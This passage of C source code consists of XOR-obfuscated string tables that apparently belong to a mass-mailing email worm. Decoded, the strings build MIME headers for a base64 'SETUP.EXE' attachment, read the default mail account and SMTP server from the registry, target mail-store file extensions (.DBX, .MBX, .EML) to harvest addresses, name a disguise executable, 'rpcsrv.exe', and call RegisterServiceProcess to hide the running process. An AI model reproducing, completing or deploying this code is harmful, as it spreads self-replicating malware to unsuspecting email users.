                   '-'     ^ ( char) 0x0FF,
                   '8'     ^ ( char) 0x0FF,
                   '8'     ^ ( char) 0x0FF,
                   '5'     ^ ( char) 0x0FF,
                   '9'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   '1'     ^ ( char) 0x0FF,
                   '"'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'g'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'q'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'b'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str0B[]={
                   0x0A        ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   '/'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   ';'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   '='     ^ ( char) 0x0FF,
                   '"'     ^ ( char) 0x0FF,
                   'S'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'U'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   '"'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'g'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'b'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   '6'     ^ ( char) 0x0FF,
                   '4'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   'D'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   ':'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'h'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   ';'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   '='     ^ ( char) 0x0FF,
                   '"'     ^ ( char) 0x0FF,
                   'S'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'U'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   '"'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str0C[]={
                   0x0A        ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str0D[]={
                   '-'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str0E[]={
                   0x0A        ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_str0F[]={
                   'Q'     ^ ( char) 0x0FF,
                   'U'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   0x0A        ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_newline[]={
                   0x0A        ^ ( char) 0x0FF,
                   0
                   } ;

       char smtp_separator[]={
                   '-'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   '-'     ^ ( char) 0x0FF,
                   '='     ^ ( char) 0x0FF,
                   '_'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'x'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '_'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '_'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '5'     ^ ( char) 0x0FF,
                   '_'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '1'     ^ ( char) 0x0FF,
                   'B'     ^ ( char) 0x0FF,
                   'D'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   '2'     ^ ( char) 0x0FF,
                   'F'     ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   '8'     ^ ( char) 0x0FF,
                   'B'     ^ ( char) 0x0FF,
                   '2'     ^ ( char) 0x0FF,
                   '8'     ^ ( char) 0x0FF,
                   '6'     ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szWindir00[]={
                   'W'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'D'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   'W'     ^ ( char) 0x0FF,
                   'S'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szWindir01[]={
                   'W'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   '9'     ^ ( char) 0x0FF,
                   '5'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szWindir02[]={
                   'W'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   '9'     ^ ( char) 0x0FF,
                   '8'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szWindir03[]={
                   'W'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szWindir04[]={
                   'W'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szWIN_INI[]={  '\\'    ^ ( char) 0x0FF,
                   'W'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szSETUP_EXE[]={
                   'S'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'U'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szSYSTEM_EXE[]={
                   'r'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'v'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'x'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szADVAPI_DLL[]={
                   'A'     ^ ( char) 0x0FF,
                   'D'     ^ ( char) 0x0FF,
                   'V'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   '3'     ^ ( char) 0x0FF,
                   '2'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   'D'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szRegOpenKeyExA[]={
                   'R'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'g'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   'p'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'K'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'x'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szRegQueryValueExA[]={
                   'R'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'g'     ^ ( char) 0x0FF,
                   'Q'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   'V'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'x'     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szRegCloseKey[]={
                   'R'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'g'     ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'K'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'y'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szAccountManager[]={
                   'S'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'w'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   '\\'        ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   '\\'        ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'g'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szDefaultMail[]={
                   'D'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'f'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szAccounts[]={
                   '\\'        ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'u'     ^ ( char) 0x0FF,
                   'n'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   '\\'    ^ ( char) 0x0FF,
                   0
                   } ;

       char szSMTPserver[]={
                   'S'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'S'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'v'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szSMTPemail[]={
                   'S'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'm'     ^ ( char) 0x0FF,
                   'a'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'l'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'A'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'd'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szExt00[]={
                   '.'     ^ ( char) 0x0FF,
                   'H'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szExt01[]={
                   '.'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szExt02[]={
                   '.'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szExt03[]={
                   '.'     ^ ( char) 0x0FF,
                   'D'     ^ ( char) 0x0FF,
                   'B'     ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szExt04[]={
                   '.'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'B'     ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szExt05[]={
                   '.'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   'H'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szExt06[]={
                   '.'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'D'     ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szOutlook[]={
                   'O'     ^ ( char) 0x0FF,
                   'U'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   'K'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szCuteFtp[]={
                   'C'     ^ ( char) 0x0FF,
                   'U'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'F'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szInternetExplorer[]={
                   'I'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'R'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   ' '     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'X'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   'O'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szTelnet[]={
                   'T'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szMirc[]={     'M'     ^ ( char) 0x0FF,
                   'I'     ^ ( char) 0x0FF,
                   'R'     ^ ( char) 0x0FF,
                   'C'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szRegisterServiceProcess[]={
                   'R'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'g'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   't'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'S'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'v'     ^ ( char) 0x0FF,
                   'i'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   'r'     ^ ( char) 0x0FF,
                   'o'     ^ ( char) 0x0FF,
                   'c'     ^ ( char) 0x0FF,
                   'e'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   's'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szKernel32[]={
                   'K'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'R'     ^ ( char) 0x0FF,
                   'N'     ^ ( char) 0x0FF,
                   'E'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   '3'     ^ ( char) 0x0FF,
                   '2'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   'D'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   'L'     ^ ( char) 0x0FF,
                   0
                   } ;

       char szTempFile[]={
                   'C'     ^ ( char) 0x0FF,
                   'H'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '0'     ^ ( char) 0x0FF,
                   '.'     ^ ( char) 0x0FF,
                   'T'     ^ ( char) 0x0FF,
                   'M'     ^ ( char) 0x0FF,
                   'P'     ^ ( char) 0x0FF,
                   0
                   } ;

       char *szAware[]={
                   szOutlook,
                   szCuteFtp,
                   szInternetExplorer,
                   szTelnet,
                   szMirc
                   } ;
